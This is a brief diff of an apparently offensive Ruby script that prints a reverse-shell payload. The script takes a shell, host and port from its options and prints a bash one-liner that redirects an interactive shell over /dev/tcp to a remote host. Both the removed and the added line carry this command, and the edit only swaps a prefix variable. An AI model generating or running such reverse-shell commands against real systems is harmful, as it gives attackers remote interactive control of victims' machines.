@@ -42,4 +42,4 @@ shell = options.target_shell
 file = options.output_file
 
 sleep(0.5)
-puts "#{h}#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
+puts "#{r}#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
